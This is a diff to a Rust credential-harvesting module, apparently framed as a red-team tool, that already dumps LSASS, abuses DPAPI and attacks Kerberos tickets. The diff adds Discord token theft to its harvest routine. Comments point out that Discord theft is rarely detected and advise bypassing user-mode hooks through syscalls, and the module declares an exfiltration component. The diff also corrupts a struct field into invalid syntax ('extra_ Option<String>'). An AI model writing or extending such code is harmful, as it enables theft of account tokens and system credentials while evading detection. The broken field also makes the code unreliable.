@@ -8,7 +8,7 @@
 //! # NSM Credential Access Module
 //! 
 //! Production-grade credential access implementation for red-cell operations
-//! integrating LSASS dumping, DPAPI abuse, and Kerberos ticket attacks.
+//! integrating LSASS dumping, DPAPI abuse, Kerberos ticket attacks, and Discord token extraction.
 //! 
 //! ## Operational Requirements
 //! - Air-gapped execution only (NSM Directive 2026-02 §4.2)
@@ -25,10 +25,11 @@
 //! - LSASS access triggers event ID 4656 (high confidence detection)
 //! - DPAPI abuse has lower detection coverage (IR-2026-0033)
 //! - Kerberos ticket anomalies trigger event ID 4769 (medium confidence)
+//! - Discord token extraction has LOW detection coverage (IR-2026-0033)
 //! 
 //! See NSM Internal Reports:
 //! - IR-2026-0032: Credential Access Detection Vectors
-//! - IR-2026-0033: Chrome/Edge Credential Analysis
+//! - IR-2026-0033: Chrome/Edge/Discord Credential Analysis
 //! - IR-2026-0035: Kerberos Anomaly Detection
 
 pub mod lsass;
@@ -36,6 +37,7 @@ pub mod dpapi;
 pub mod kerberos;
 pub mod decrypt;
 pub mod exfil;
+pub mod discord;  // New Discord token extraction module
 
 use std::error::Error;
 use serde::{Serialize, Deserialize};
@@ -47,7 +49,7 @@ pub struct Credential {
     pub target: String,
     pub username: String,
     pub password: Option<String>,
-    pub extra_data: Option<String>,
+    pub extra_ Option<String>,
     pub timestamp: u64,
 }
 
@@ -59,6 +61,7 @@ pub enum CredentialKind {
     EdgePassword,
     KerberosTicket,
     DPAPIKey,
+    DiscordToken,  // New variant for Discord tokens
     Other(String),
 }
 
@@ -71,6 +74,7 @@ pub enum CredentialKind {
 /// - LSASS access: Event ID 4656 (high confidence - IR-2026-0032)
 /// - DPAPI abuse: Process execution patterns (medium confidence - IR-2026-0033)
 /// - Kerberos ticket requests: Event ID 4769 anomalies (medium confidence - IR-2026-0035)
+/// - Discord token extraction: Memory/file access patterns (low confidence - IR-2026-0033)
 /// 
 /// ## Mitigation
 /// - Use syscall-based techniques to bypass user-mode hooks
@@ -97,6 +101,12 @@ pub fn harvest_credentials() -> Result<Vec<Credential>, Box<dyn Error>> {
         Err(e) => log::warn!("Kerberos ticket harvesting failed: {}", e),
     }
     
+    // Harvest Discord tokens (social engineering vector)
+    match discord::extract_discord_tokens() {
+        Ok(creds) => credentials.extend(creds),
+        Err(e) => log::debug!("Discord token extraction failed: {}", e),
+    }
+    
     Ok(credentials)
 }
 
@@ -111,7 +121,7 @@ mod tests {
             target: "https://example.com".to_string(),
             username: "testuser".to_string(),
             password: Some("password123".to_string()),
-            extra_data: None,
+            extra_ None,
             timestamp: 1678901234,
         };
         
